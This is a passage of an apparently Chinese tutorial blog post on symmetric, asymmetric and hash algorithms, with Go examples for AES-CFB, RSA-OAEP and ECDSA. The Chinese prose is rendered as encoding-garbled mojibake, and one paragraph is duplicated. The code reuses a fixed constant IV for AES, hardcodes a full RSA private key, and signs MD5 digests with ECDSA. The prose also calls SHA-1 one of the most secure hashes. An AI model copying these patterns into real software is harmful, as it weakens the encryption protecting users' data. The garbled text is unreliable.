ç§ä¸åŒçš„æ–¹æ³•æ¥æ‰§è¡ŒæŽ’åˆ—å’Œç½®æ¢è¿ç®—ã€‚AESæ˜¯ä¸€ä¸ªè¿­ä»£çš„ã€å¯¹ç§°å¯†é’¥åˆ†ç»„çš„å¯†ç ï¼Œå®ƒå¯ä»¥ä½¿ç”¨128ã€192 å’Œ 256 ä½å¯†é’¥ï¼Œå¹¶ä¸”ç”¨ 128 ä½ï¼ˆ16å­—èŠ‚ï¼‰åˆ†ç»„åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚ä¸Žå…¬å…±å¯†é’¥å¯†ç ä½¿ç”¨å¯†é’¥å¯¹ä¸åŒï¼Œå¯¹ç§°å¯†é’¥å¯†ç ä½¿ç”¨ç›¸åŒçš„å¯†é’¥åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚é€šè¿‡åˆ†ç»„å¯†ç è¿”å›žçš„åŠ å¯†æ•°æ®çš„ä½æ•°ä¸Žè¾“å…¥æ•°æ®ç›¸åŒã€‚è¿­ä»£åŠ å¯†ä½¿ç”¨ä¸€ä¸ªå¾ªçŽ¯ç»“æž„ï¼Œåœ¨è¯¥å¾ªçŽ¯ä¸­é‡å¤ç½®æ¢å’Œæ›¿æ¢è¾“å…¥æ•°æ®ã€‚ DESDESå…¨ç§°ä¸ºData Encryption Standardï¼Œå³æ•°æ®åŠ å¯†æ ‡å‡†ï¼Œæ˜¯ä¸€ç§ä½¿ç”¨å¯†é’¥åŠ å¯†çš„å—ç®—æ³•ï¼Œ1977å¹´è¢«ç¾Žå›½è”é‚¦æ”¿åºœçš„å›½å®¶æ ‡å‡†å±€ç¡®å®šä¸ºè”é‚¦èµ„æ–™å¤„ç†æ ‡å‡†ï¼ˆFIPSï¼‰ï¼Œå¹¶æŽˆæƒåœ¨éžå¯†çº§æ”¿åºœé€šä¿¡ä¸­ä½¿ç”¨ï¼ŒéšåŽè¯¥ç®—æ³•åœ¨å›½é™…ä¸Šå¹¿æ³›æµä¼ å¼€æ¥ã€‚ AESä¸Ž3DESçš„æ¯”è¾ƒ ç®—æ³•åç§° ç®—æ³•ç±»åž‹ å¯†é’¥é•¿åº¦ é€Ÿåº¦ è§£å¯†æ—¶é—´ï¼ˆå»ºè®¾æœºå™¨æ¯ç§’å°è¯•255ä¸ªå¯†é’¥ï¼‰ èµ„æºæ¶ˆè€— AES å¯¹ç§°blockå¯†ç  128ã€192ã€256ä½ é«˜ 1490000äº¿å¹´ ä½Ž 3DES å¯¹ç§°feistelå¯†ç  112ä½æˆ–168ä½ ä½Ž 46äº¿å¹´ ä¸­ ç ´è§£åŽ†å²åŽ†å²ä¸Šæœ‰ä¸‰æ¬¡å¯¹DESæœ‰å½±å“çš„æ”»å‡»å®žéªŒã€‚1997å¹´ï¼Œåˆ©ç”¨å½“æ—¶å„å›½ 7ä¸‡å°è®¡ç®—æœºï¼ŒåŽ†æ—¶96å¤©ç ´è§£äº†DESçš„å¯†é’¥ã€‚1998å¹´ï¼Œç”µå­è¾¹å¢ƒåŸºé‡‘ä¼šï¼ˆEFFï¼‰ç”¨25ä¸‡ç¾Žå…ƒåˆ¶é€ çš„ä¸“ç”¨è®¡ç®—æœºï¼Œç”¨56å°æ—¶ç ´è§£äº†DESçš„å¯†é’¥ã€‚1999å¹´ï¼ŒEFFç”¨22å°æ—¶15åˆ†å®Œæˆäº†ç ´è§£å·¥ä½œã€‚å› æ­¤ã€‚æ›¾ç»æœ‰è¿‡å“è¶Šè´¡çŒ®çš„DESä¹Ÿä¸èƒ½æ»¡è¶³æˆ‘ä»¬æ—¥ç›Šå¢žé•¿çš„éœ€æ±‚äº†ã€‚ ä»£ç ç¤ºä¾‹ç»¼ä¸Šçœ‹æ¥AESå®‰å…¨åº¦æœ€é«˜, åŸºæœ¬çŽ°çŠ¶å°±æ˜¯AESå·²ç»æ›¿ä»£DESæˆä¸ºæ–°ä¸€ä»£å¯¹ç§°åŠ å¯†çš„æ ‡å‡†, ä¸‹é¢æ˜¯Golangä¸­AESä½¿ç”¨çš„æ —å­12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package mainimport ( "crypto/aes" "crypto/cipher" "fmt")var commonIV = []byte&#123;0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f&#125;func encrypt(plainText string, keyText string) (cipherByte []byte, err error) &#123; // è½¬æ¢æˆå­—èŠ‚æ•°æ®, æ–¹ä¾¿åŠ å¯† plainByte := []byte(plainText) keyByte := []byte(keyText) // åˆ›å»ºåŠ å¯†ç®—æ³•aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return nil, err &#125; //åŠ å¯†å­—ç¬¦ä¸² cfb := cipher.NewCFBEncrypter(c, commonIV) cipherByte = make([]byte, len(plainByte)) cfb.XORKeyStream(cipherByte, plainByte) return&#125;func decrypt(cipherByte []byte, keyText string) (plainText string, err error) &#123; // è½¬æ¢æˆå­—èŠ‚æ•°æ®, æ–¹ä¾¿åŠ å¯† keyByte := []byte(keyText) // åˆ›å»ºåŠ å¯†ç®—æ³•aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return "", err &#125; // è§£å¯†å­—ç¬¦ä¸² cfbdec := cipher.NewCFBDecrypter(c, commonIV) plainByte := make([]byte, len(cipherByte)) cfbdec.XORKeyStream(plainByte, cipherByte) plainText = string(plainByte) return&#125;func main() &#123; plain := "The text need to be encrypt." // AES è§„å®šæœ‰3ç§é•¿åº¦çš„key: 16, 24, 32åˆ†åˆ«å¯¹åº”AES-128, AES-192, or AES-256 key := "abcdefgehjhijkmlkjjwwoew" // åŠ å¯† cipherByte, err := encrypt(plain, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%s ==&gt; %x\n", plain, cipherByte) // è§£å¯† plainText, err := decrypt(cipherByte, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%x ==&gt; %s\n", cipherByte, plainText)&#125; éžå¯¹ç§°ç®—æ³•éžå¯¹ç§°åŠ å¯†ç®—æ³•å¸¸ç”¨äºŽæ•°æ®åŠ å¯†å’Œèº«ä»½è®¤è¯, å¸¸è§çš„éžå¯¹ç§°åŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼š RSA: ç”±RSAå…¬å¸å‘æ˜Žï¼Œæ˜¯ä¸€ä¸ªæ”¯æŒå˜é•¿å¯†é’¥çš„å…¬å…±å¯†é’¥ç®—æ³•ï¼Œéœ€è¦åŠ å¯†çš„æ–‡ä»¶å—çš„é•¿åº¦ä¹Ÿæ˜¯å¯å˜çš„ï¼› DSA(Digital Signature Algorithm): æ•°å­—ç­¾åç®—æ³•ï¼Œæ˜¯ä¸€ç§æ ‡å‡†çš„DSS(æ•°å­—ç­¾åæ ‡å‡†)ï¼› ECC(Elliptic Curves Cryptography): æ¤­åœ†æ›²çº¿å¯†ç ç¼–ç å­¦ã€‚ ECDSA(Elliptic Curve Digital Signature Algorithm): åŸºäºŽæ¤­åœ†æ›²çº¿çš„DSAç­¾åç®—æ³• DSADSAæ˜¯åŸºäºŽæ•´æ•°æœ‰é™åŸŸç¦»æ•£å¯¹æ•°éš¾é¢˜çš„ï¼Œå…¶å®‰å…¨æ€§ä¸ŽRSAç›¸æ¯”å·®ä¸å¤šã€‚DSAçš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯ä¸¤ä¸ªç´ æ•°å…¬å¼€ï¼Œè¿™æ ·ï¼Œå½“ä½¿ç”¨åˆ«äººçš„på’Œqæ—¶ï¼Œå³ä½¿ä¸çŸ¥é“ç§é’¥ï¼Œä½ ä¹Ÿèƒ½ç¡®è®¤å®ƒä»¬æ˜¯å¦æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œè¿˜æ˜¯ä½œäº†æ‰‹è„šã€‚RSAç®—æ³•å´åšä¸åˆ°ä½†æ˜¯å…¶ç¼ºç‚¹å°±æ˜¯åªèƒ½ç”¨äºŽæ•°å­—ç­¾å, ä¸èƒ½ç”¨äºŽåŠ å¯†ã€‚ RSAåœ¨1976å¹´ï¼Œç”±äºŽå¯¹ç§°åŠ å¯†ç®—æ³•å·²ç»ä¸èƒ½æ»¡è¶³éœ€è¦ï¼ŒDiffie å’ŒHellmanå‘è¡¨äº†ä¸€ç¯‡å«ã€Šå¯†ç å­¦æ–°åŠ¨å‘ã€‹çš„æ–‡ç« ï¼Œä»‹ç»äº†å…¬åŒ™åŠ å¯†çš„æ¦‚å¿µï¼Œç”±Rivetã€Shamirã€Adelmanæå‡ºäº†RSAç®—æ³•ã€‚RSAæ˜¯ç›®å‰æœ€æœ‰å½±å“åŠ›çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå®ƒèƒ½å¤ŸæŠµæŠ—åˆ°ç›®å‰ä¸ºæ­¢å·²çŸ¥çš„ç»å¤§å¤šæ•°å¯†ç æ”»å‡»ï¼Œå·²è¢«ISOæŽ¨èä¸ºå…¬é’¥æ•°æ®åŠ å¯†æ ‡å‡†ã€‚ ECCECCåŠ å¯†çš„åŽŸç†ä¾èµ–æ¤­åœ†æ›²çº¿ä¸Šçš„éš¾é¢˜ã€‚ä»Šå¤©åªæœ‰çŸ­çš„RSAé’¥åŒ™æ‰å¯èƒ½è¢«å¼ºåŠ›æ–¹å¼è§£ç ´ã€‚åˆ°2008å¹´ä¸ºæ­¢ï¼Œä¸–ç•Œä¸Šè¿˜æ²¡æœ‰ä»»ä½•å¯é çš„æ”»å‡»RSAç®—æ³•çš„æ–¹å¼ã€‚åªè¦å…¶é’¥åŒ™çš„é•¿åº¦è¶³å¤Ÿé•¿ï¼Œç”¨RSAåŠ å¯†çš„ä¿¡æ¯å®žé™…ä¸Šæ˜¯ä¸èƒ½è¢«è§£ç ´çš„ã€‚ä½†åœ¨åˆ†å¸ƒå¼è®¡ç®—å’Œé‡å­è®¡ç®—æœºç†è®ºæ—¥è¶‹æˆç†Ÿçš„ä»Šå¤©ï¼ŒRSAåŠ å¯†å®‰å…¨æ€§å—åˆ°äº†æŒ‘æˆ˜ã€‚éšç€åˆ†è§£å¤§æ•´æ•°æ–¹æ³•çš„è¿›æ­¥åŠå®Œå–„ã€è®¡ç®—æœºé€Ÿåº¦çš„æé«˜ä»¥åŠè®¡ç®—æœºç½‘ç»œçš„å‘å±•ï¼Œä¸ºäº†ä¿éšœæ•°æ®çš„å®‰å…¨ï¼ŒRSAçš„å¯†é’¥éœ€è¦ä¸æ–­å¢žåŠ ï¼Œä½†æ˜¯ï¼Œå¯†é’¥é•¿åº¦çš„å¢žåŠ å¯¼è‡´äº†å…¶åŠ è§£å¯†çš„é€Ÿåº¦å¤§ä¸ºé™ä½Žï¼Œç¡¬ä»¶å®žçŽ°ä¹Ÿå˜å¾—è¶Šæ¥è¶Šéš¾ä»¥å¿å—ï¼Œè¿™å¯¹ä½¿ç”¨RSAçš„åº”ç”¨å¸¦æ¥äº†å¾ˆé‡çš„è´Ÿæ‹…ï¼Œå› æ­¤éœ€è¦ä¸€ç§æ–°çš„ç®—æ³•æ¥ä»£æ›¿RSAã€‚1985å¹´N.Koblitzå’ŒMilleræå‡ºå°†æ¤­åœ†æ›²çº¿ç”¨äºŽå¯†ç ç®—æ³•ï¼Œæ ¹æ®æ˜¯æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ç¾¤ä¸­çš„ç¦»æ•£å¯¹æ•°é—®é¢˜ECDLPã€‚ECDLPæ˜¯æ¯”å› å­åˆ†è§£é—®é¢˜æ›´éš¾çš„é—®é¢˜ï¼Œå®ƒæ˜¯æŒ‡æ•°çº§çš„éš¾åº¦ã€‚ ECDSAå› ä¸ºåœ¨æ•°å­—ç­¾åçš„å®‰å…¨æ€§é«˜, åŸºäºŽECCçš„DSAæ›´é«˜, æ‰€ä»¥éžå¸¸é€‚åˆæ•°å­—ç­¾åä½¿ç”¨åœºæ™¯, åœ¨SSH TLSæœ‰å¹¿æ³›ä½¿ç”¨, ECCæŠŠç¦»æ•£å¯¹æ•°å®‰å…¨æ€§é«˜å¾ˆå°‘, æ‰€ä»¥ECCåœ¨å®‰å…¨é¢†åŸŸä¼šæˆä¸ºä¸‹ä¸€ä¸ªæ ‡å‡†ã€‚ ECCä¸ŽRSAçš„æ¯”è¾ƒECCå’ŒRSAç›¸æ¯”ï¼Œåœ¨è®¸å¤šæ–¹é¢éƒ½æœ‰å¯¹ç»å¯¹çš„ä¼˜åŠ¿ï¼Œä¸»è¦ä½“çŽ°åœ¨ä»¥ä¸‹æ–¹é¢ï¼š æŠ—æ”»å‡»æ€§å¼ºã€‚ç›¸åŒçš„å¯†é’¥é•¿åº¦ï¼Œå…¶æŠ—æ”»å‡»æ€§è¦å¼ºå¾ˆå¤šå€ã€‚ è®¡ç®—é‡å°ï¼Œå¤„ç†é€Ÿåº¦å¿«ã€‚ECCæ€»çš„é€Ÿåº¦æ¯”RSAã€DSAè¦å¿«å¾—å¤šã€‚ å­˜å‚¨ç©ºé—´å ç”¨å°ã€‚ECCçš„å¯†é’¥å°ºå¯¸å’Œç³»ç»Ÿå‚æ•°ä¸ŽRSAã€DSAç›¸æ¯”è¦å°å¾—å¤šï¼Œæ„å‘³ç€å®ƒæ‰€å çš„å­˜è´®ç©ºé—´è¦å°å¾—å¤šã€‚è¿™å¯¹äºŽåŠ å¯†ç®—æ³•åœ¨ICå¡ä¸Šçš„åº”ç”¨å…·æœ‰ç‰¹åˆ«é‡è¦çš„æ„ä¹‰ã€‚ å¸¦å®½è¦æ±‚ä½Žã€‚å½“å¯¹é•¿æ¶ˆæ¯è¿›è¡ŒåŠ è§£å¯†æ—¶ï¼Œä¸‰ç±»å¯†ç ç³»ç»Ÿæœ‰ç›¸åŒçš„å¸¦å®½è¦æ±‚ï¼Œä½†åº”ç”¨äºŽçŸ­æ¶ˆæ¯æ—¶ECCå¸¦å®½è¦æ±‚å´ä½Žå¾—å¤šã€‚å¸¦å®½è¦æ±‚ä½Žä½¿ECCåœ¨æ— çº¿ç½‘ç»œé¢†åŸŸå…·æœ‰å¹¿æ³›çš„åº”ç”¨å‰æ™¯ã€‚ ECCçš„è¿™äº›ç‰¹ç‚¹ä½¿å®ƒå¿…å°†å–ä»£RSAï¼Œæˆä¸ºé€šç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ã€‚æ¯”å¦‚SETåè®®çš„åˆ¶å®šè€…å·²æŠŠå®ƒä½œä¸ºä¸‹ä¸€ä»£SETåè®®ä¸­ç¼ºçœçš„å…¬é’¥å¯†ç ç®—æ³•ã€‚ECCçš„è¿™äº›ç‰¹ç‚¹ä½¿å®ƒå¿…å°†å–ä»£RSAï¼Œæˆä¸ºé€šç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ã€‚æ¯”å¦‚SETåè®®çš„åˆ¶å®šè€…å·²æŠŠå®ƒä½œä¸ºä¸‹ä¸€ä»£SETåè®®ä¸­ç¼ºçœçš„å…¬é’¥å¯†ç ç®—æ³•ã€‚ ä»£ç ç¤ºä¾‹ECCæ˜¯æœªæ¥çš„ä¸€ä¸ªè¶‹åŠ¿, åœ¨IOTè¡Œä¸šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©, ä½†æ˜¯çŽ°åœ¨è¢«å¹¿æ³›ä½¿ç”¨çš„ä¾ç„¶æ˜¯RSAä»¥ä¸‹ä½¿ç”¨RSAè¿›è¡ŒåŠ è§£å¯†: ä½¿ç”¨å¯¹æ–¹çš„å…¬é’¥åŠ å¯†æ•°æ®, ç„¶åŽå‘ç»™å¯¹æ–¹, å¯¹æ–¹ä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495package mainimport ( "crypto/rand" "crypto/rsa" "crypto/sha1" "crypto/x509" "encoding/pem" "fmt")// ä½¿ç”¨å¯¹æ–¹çš„å…¬é’¥çš„æ•°æ®, åªæœ‰å¯¹æ–¹çš„ç§é’¥æ‰èƒ½è§£å¼€func encrypt(plain string, publicKey string) (cipherByte []byte, err error) &#123; msg := []byte(plain) // è§£ç å…¬é’¥ pubBlock, _ := pem.Decode([]byte(publicKey)) // è¯»å–å…¬é’¥ pubKeyValue, err := x509.ParsePKIXPublicKey(pubBlock.Bytes) if err != nil &#123; panic(err) &#125; pub := pubKeyValue.(*rsa.PublicKey) // åŠ å¯†æ•°æ®æ–¹æ³•: ä¸ç”¨ä½¿ç”¨EncryptPKCS1v15æ–¹æ³•åŠ å¯†,æºç é‡Œé¢æŽ¨èä½¿ç”¨EncryptOAEP, å› æ­¤è¿™é‡Œä½¿ç”¨å®‰å…¨çš„æ–¹æ³•åŠ å¯† encryptOAEP, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, pub, msg, nil) if err != nil &#123; panic(err) &#125; cipherByte = encryptOAEP return&#125;// ä½¿ç”¨ç§é’¥è§£å¯†å…¬é’¥åŠ å¯†çš„æ•°æ®func decrypt(cipherByte []byte, privateKey string) (plainText string, err error) &#123; // è§£æžå‡ºç§é’¥ priBlock, _ := pem.Decode([]byte(privateKey)) priKey, err := x509.ParsePKCS1PrivateKey(priBlock.Bytes) if err != nil &#123; panic(err) &#125; // è§£å¯†RSA-OAEPæ–¹å¼åŠ å¯†åŽçš„å†…å®¹ decryptOAEP, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priKey, cipherByte, nil) if err != nil &#123; panic(err) &#125; plainText = string(decryptOAEP) return&#125;func test() &#123; msg := "Content bo be encrypted!" // èŽ·å–å…¬é’¥, ç”Ÿäº§çŽ¯å¢ƒå¾€å¾€æ˜¯æ–‡ä»¶ä¸­è¯»å–, è¿™é‡Œä¸ºäº†æµ‹è¯•æ–¹ä¾¿, ç›´æŽ¥ç”Ÿæˆäº†. publicKeyData := `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQAB-----END PUBLIC KEY-----` // èŽ·å–ç§é’¥ privateKeyData := `-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQABAoGBAJlNxenTQj6OfCl9FMR2jlMJjtMrtQT9InQEE7m3m7bLHeC+MCJOhmNVBjaMZpthDORdxIZ6oCuOf6Z2+Dl35lntGFh5J7S34UP2BWzF1IyyQfySCNexGNHKT1G1XKQtHmtc2gWWthEg+S6ciIyw2IGrrP2Rke81vYHExPrexf0hAkEA9Izb0MiYsMCB/jemLJB0Lb3Y/B8xjGjQFFBQT7bmwBVjvZWZVpnMnXi9sWGdgUpxsCuAIROXjZ40IRZ2C9EouwJBAOPjPvV8Sgw4vaseOqlJvSq/C/pIFx6RVznDGlc8bRg7SgTPpjHG4G+M3mVgpCX1a/EU1mB+fhiJ2LAZ/pTtY6sCQGaW9NwIWu3DRIVGCSMm0mYh/3X9DAcwLSJoctiODQ1Fq9rreDE5QfpJnaJdJfsIJNtX1F+L3YceeBXtW0Ynz2MCQBI89KP274Is5FkWkUFNKnuKUK4WKOuEXEO+LpR+vIhs7k6WQ8nGDd4/mujoJBr5mkrwDPwqA3N5TMNDQVGv8gMCQQCaKGJgWYgvo3/milFfImbp+m7/Y3vCptarldXrYQWOAQjxwc71ZGBFDITYvdgJM1MTqc8xQek1FXn1vfpy2c6O-----END RSA PRIVATE KEY-----` cipherData, err := encrypt(msg, publicKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("encrypt message: %x\n", cipherData) plainData, err := decrypt(cipherData, privateKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("decrypt message:%s\n", plainData)&#125;func main() &#123; test()&#125; ecdsaæ­£åœ¨é€æ¸æˆä¸ºæ•°å­—ç­¾åçš„ä¸€ä¸ªæ ‡å‡†, åœ¨golangçš„sshåº“ä¸­å°±æ˜¯ä½¿ç”¨è¿™ä¸ªç®—æ³•æ¥ç­¾åçš„: Aä½¿ç”¨è‡ªå·±çš„ç§é’¥ç­¾åä¸€æ®µæ•°æ®, ç„¶åŽå°†å…¬é’¥å‘æ”¾å‡ºåŽ». ç”¨æˆ·æ‹¿åˆ°å…¬é’¥åŽ, éªŒè¯æ•°æ®çš„ç­¾å,å¦‚æžœé€šè¿‡åˆ™è¯æ˜Žæ•°æ®æ¥æºæ˜¯A, ä»Žè€Œè¾¾åˆ°èº«ä»½è®¤è¯çš„ä½œç”¨.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package mainimport ( "crypto/ecdsa" "crypto/elliptic" "crypto/md5" "crypto/rand" "fmt" "hash" "io" "math/big")// SignData ç”¨äºŽä¿å­˜ç­¾åçš„æ•°æ®type SignData struct &#123; r *big.Int s *big.Int signhash *[]byte signature *[]byte&#125;// ä½¿ç”¨ç§é’¥ç­¾åä¸€æ®µæ•°æ®func sign(message string, privateKey *ecdsa.PrivateKey) (signData *SignData, err error) &#123; // ç­¾åæ•°æ® var h hash.Hash h = md5.New() r := big.NewInt(0) s := big.NewInt(0) io.WriteString(h, message) signhash := h.Sum(nil) r, s, serr := ecdsa.Sign(rand.Reader, privateKey, signhash) if serr != nil &#123; return nil, serr &#125; signature := r.Bytes() signature = append(signature, s.Bytes()...) signData = &amp;SignData&#123; r: r, s: s, signhash: &amp;signhash, signature: &amp;signature, &#125; return&#125;// æ ¡éªŒæ•°å­—ç­¾åfunc verifySign(signData *SignData, publicKey *ecdsa.PublicKey) (status bool) &#123; status = ecdsa.Verify(publicKey, *signData.signhash, signData.r, signData.s) return&#125;func test() &#123; //ä½¿ç”¨æ¤­åœ†æ›²çº¿çš„P256ç®—æ³•,çŽ°åœ¨ä¸€å…±ä¹Ÿå°±å®žçŽ°äº†4ç§,æˆ‘ä»¬ä½¿ç”¨æŠ˜ä¸­ä¸€ç§,å…·ä½“è§http://golang.org/pkg/crypto/elliptic/#P256 pubkeyCurve := elliptic.P256() privateKey := new(ecdsa.PrivateKey) // ç”Ÿæˆç§˜é’¥å¯¹ privateKey, err := ecdsa.GenerateKey(pubkeyCurve, rand.Reader) if err != nil &#123; panic(err) &#125; var publicKey ecdsa.PublicKey publicKey = privateKey.PublicKey // ç­¾å signData, err := sign("This is a message to be signed and verified by ECDSA!", privateKey) if err != nil &#123; panic(err) &#125; fmt.Printf("The signhash: %x\nThe signature: %x\n", *signData.signhash, *signData.signature) // éªŒè¯ status := verifySign(signData, &amp;publicKey) fmt.Printf("The verify result is: %v\n", status)&#125;func main() &#123; test()&#125; æ•£åˆ—ç®—æ³•æ•£åˆ—æ˜¯ä¿¡æ¯çš„æç‚¼ï¼Œé€šå¸¸å…¶é•¿åº¦è¦æ¯”ä¿¡æ¯å°å¾—å¤šï¼Œä¸”ä¸ºä¸€ä¸ªå›ºå®šé•¿åº¦ã€‚åŠ å¯†æ€§å¼ºçš„æ•£åˆ—ä¸€å®šæ˜¯ä¸å¯é€†çš„ï¼Œè¿™å°±æ„å‘³ç€é€šè¿‡æ•£åˆ—ç»“æžœï¼Œæ— æ³•æŽ¨å‡ºä»»ä½•éƒ¨åˆ†çš„åŽŸå§‹ä¿¡æ¯ã€‚ä»»ä½•è¾“å…¥ä¿¡æ¯çš„å˜åŒ–ï¼Œå“ªæ€•ä»…ä¸€ä½ï¼Œéƒ½å°†å¯¼è‡´æ•£åˆ—ç»“æžœçš„æ˜Žæ˜¾å˜åŒ–ï¼Œè¿™ç§°ä¹‹ä¸ºé›ªå´©æ•ˆåº”ã€‚æ•£åˆ—è¿˜åº”è¯¥æ˜¯é˜²å†²çªçš„ï¼Œå³æ‰¾ä¸å‡ºå…·æœ‰ç›¸åŒæ•£åˆ—ç»“æžœçš„ä¸¤æ¡ä¿¡æ¯ã€‚å…·æœ‰è¿™äº›ç‰¹æ€§çš„æ•£åˆ—ç»“æžœå°±å¯ä»¥ç”¨äºŽéªŒè¯ä¿¡æ¯æ˜¯å¦è¢«ä¿®æ”¹ã€‚å¸¸ç”¨äºŽä¿è¯æ•°æ®å®Œæ•´æ€§å•å‘æ•£åˆ—å‡½æ•°ä¸€èˆ¬ç”¨äºŽäº§ç”Ÿæ¶ˆæ¯æ‘˜è¦ï¼Œå¯†é’¥åŠ å¯†ç­‰ï¼Œå¸¸è§çš„æœ‰ï¼š MD5(Message Digest Algorithm 5): æ˜¯RSAæ•°æ®å®‰å…¨å…¬å¸å¼€å‘çš„ä¸€ç§å•å‘æ•£åˆ—ç®—æ³•ã€‚ SHA(Secure Hash Algorithm): å¯ä»¥å¯¹ä»»æ„é•¿åº¦çš„æ•°æ®è¿ç®—ç”Ÿæˆä¸€ä¸ª160ä½çš„æ•°å€¼ï¼› MD5MD5å³Message-Digest Algorithm 5ï¼ˆä¿¡æ¯-æ‘˜è¦ç®—æ³•5ï¼‰ï¼Œç”¨äºŽç¡®ä¿ä¿¡æ¯ä¼ è¾“å®Œæ•´ä¸€è‡´ã€‚æ˜¯è®¡ç®—æœºå¹¿æ³›ä½¿ç”¨çš„æ‚å‡‘ç®—æ³•ä¹‹ä¸€ï¼ˆåˆè¯‘æ‘˜è¦ç®—æ³•ã€å“ˆå¸Œç®—æ³•ï¼‰ï¼Œä¸»æµç¼–ç¨‹è¯­è¨€æ™®éå·²æœ‰MD5å®žçŽ°ã€‚å°†æ•°æ®ï¼ˆå¦‚æ±‰å­—ï¼‰è¿ç®—ä¸ºå¦ä¸€å›ºå®šé•¿åº¦å€¼ï¼Œæ˜¯æ‚å‡‘ç®—æ³•çš„åŸºç¡€åŽŸç†ï¼ŒMD5çš„å‰èº«æœ‰MD2ã€MD3å’ŒMD4 SHA-1åœ¨1993å¹´ï¼Œå®‰å…¨æ•£åˆ—ç®—æ³•ï¼ˆSHAï¼‰ç”±ç¾Žå›½å›½å®¶æ ‡å‡†å’ŒæŠ€æœ¯åä¼š(NIST)æå‡ºï¼Œå¹¶ä½œä¸ºè”é‚¦ä¿¡æ¯å¤„ç†æ ‡å‡†ï¼ˆFIPS PUB 180ï¼‰å…¬å¸ƒï¼›1995å¹´åˆå‘å¸ƒäº†ä¸€ä¸ªä¿®è®¢ç‰ˆFIPS PUB 180-1ï¼Œé€šå¸¸ç§°ä¹‹ä¸ºSHA-1ã€‚SHA-1æ˜¯åŸºäºŽMD4ç®—æ³•çš„ï¼Œå¹¶ä¸”å®ƒçš„è®¾è®¡åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯æ¨¡ä»¿MD4çš„ã€‚çŽ°åœ¨å·²æˆä¸ºå…¬è®¤çš„æœ€å®‰å…¨çš„æ•£åˆ—ç®—æ³•ä¹‹ä¸€ï¼Œå¹¶è¢«å¹¿æ³›ä½¿ç”¨ã€‚SHA-1æ˜¯ä¸€ç§æ•°æ®åŠ å¯†ç®—æ³•ï¼Œè¯¥ç®—æ³•çš„æ€æƒ³æ˜¯æŽ¥æ”¶ä¸€æ®µæ˜Žæ–‡ï¼Œç„¶åŽä»¥ä¸€ç§ä¸å¯é€†çš„æ–¹å¼å°†å®ƒè½¬æ¢æˆä¸€æ®µï¼ˆé€šå¸¸æ›´å°ï¼‰å¯†æ–‡ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ç†è§£ä¸ºå–ä¸€ä¸²è¾“å…¥ç ï¼ˆç§°ä¸ºé¢„æ˜ å°„æˆ–ä¿¡æ¯ï¼‰ï¼Œå¹¶æŠŠå®ƒä»¬è½¬åŒ–ä¸ºé•¿åº¦è¾ƒçŸ­ã€ä½æ•°å›ºå®šçš„è¾“å‡ºåºåˆ—å³æ•£åˆ—å€¼ï¼ˆä¹Ÿç§°ä¸ºä¿¡æ¯æ‘˜è¦æˆ–ä¿¡æ¯è®¤è¯ä»£ç ï¼‰çš„è¿‡ç¨‹ã€‚è¯¥ç®—æ³•è¾“å…¥æŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ä¸è¶…è¿‡264ä½ï¼Œäº§ç”Ÿçš„è¾“å‡ºæ˜¯ä¸€ä¸ª160ä½çš„æŠ¥æ–‡æ‘˜è¦ã€‚è¾“å…¥æ˜¯æŒ‰512 ä½çš„åˆ†ç»„è¿›è¡Œå¤„ç†çš„ã€‚SHA-1æ˜¯ä¸å¯é€†çš„ã€é˜²å†²çªï¼Œå¹¶å…·æœ‰è‰¯å¥½çš„é›ªå´©æ•ˆåº”ã€‚sha1æ˜¯SHAå®¶æ—çš„äº”ä¸ªç®—æ³•ä¹‹ä¸€(å…¶å®ƒå››ä¸ªæ˜¯SHA-224ã€SHA-256ã€SHA-384ï¼Œå’ŒSHA-512) HMacHmacç®—æ³•ä¹Ÿæ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå®ƒå¯ä»¥åˆ©ç”¨MD5æˆ–SHA1ç­‰å“ˆå¸Œç®—æ³•ã€‚ä¸åŒçš„æ˜¯ï¼ŒHmacè¿˜éœ€è¦ä¸€ä¸ªå¯†é’¥, åªè¦å¯†é’¥å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆåŒæ 